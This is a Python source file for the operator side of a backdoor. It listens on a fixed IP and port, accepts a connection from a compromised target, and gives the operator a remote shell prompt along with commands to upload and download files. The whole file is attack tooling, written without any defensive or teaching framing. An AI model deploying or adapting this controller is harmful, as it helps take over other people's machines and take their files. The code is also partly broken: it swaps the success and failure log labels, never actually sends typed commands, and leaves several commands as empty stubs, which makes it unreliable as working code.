lhost="192.168.100.21"
lport="8989"
import socket
import os
import json
from colorama import Fore

import datetime

log_time = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

# def delete_logs(file):
#     if os.path.exists(file):
#         os.remove(file)

with open("logs.txt", "a+") as lg:
    lg.write(f"\n-------- {log_time} ----------\n")


def log(data, ERROR=False):
    if ERROR:
        with open("logs.txt", "a+") as l:
            l.write(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] -- [Success] {data}\n")

    else:
        with open("logs.txt", "a+") as l:
            l.write(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] -- [Failed] {data}\n")


W = Fore.LIGHTWHITE_EX
C = Fore.CYAN
Y = Fore.YELLOW
G = Fore.GREEN
R = Fore.RED


def send_data(command):
    log(f"Sent: {command}", True)
    jsondata = json.dumps(command)
    target.send(jsondata.encode())


def recv_data():
    data = ""
    while True:
        try:

            data = data + target.recv(1024).decode().rstrip()
            log("Data received", True)
            return json.loads(data)

        except ValueError:
            log("Data wasn't received")
            continue


def upload_file(file):
    print(f"{W}[~>] {C}Uploading {file}")
    with open(file, "rb") as f:
        f = f.read()
        target.send(f)
    print(f"{W}~> {Y}{file} {C}Uploaded successfully! ")
    log(f"File {file} uploaded", True)


def download(file):
    print(f"{W}[~>] {C}Downloading {file}")
    with open(file, "wb") as f:
        target.settimeout(1)
        data = target.recv(1024)
        while data:
            try:
                f.write(data)
                data = target.recv(1024)
                log(f"Downloaded {file}", True)
            except socket.timeout:
                log(f"Download {file}")
                break

        target.settimeout(None)
    print(f"{W}~> {Y}{file} {C}Downloaded successfully! ")


def target_communication():
    while True:
        command = input(f"{W}* Shell~%s{Y}:" % str(ip))

        if command == "quit":

            break

        elif command == "clear":
            os.system("clear")

        elif command[:3] == "cd ":
            pass

        elif command[:7] == "upload ":
            upload_file(command[7:])

        elif command[:9] == "download ":
            download(command[9:])

        elif command[:3] == "rm ":
            pass

        elif command == "screenshot":
            pass
        elif command[:4] == "url ":
            pass
        else:
            result = recv_data()
            print(f"{R}{result}")


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((lhost , int(lport)))
print(f"{W}[+] {C}Listening For Incoming Connections{W}...")

sock.listen(5)
target, ip = sock.accept()
print(f"\n{G}[+] {Y}Target Connected From: {W}{ip}")
try:
    target_communication()
    log(f"Backdoor executed: {target} | {ip}")
except:
    log(f"Something went wrong {target} | {ip}")
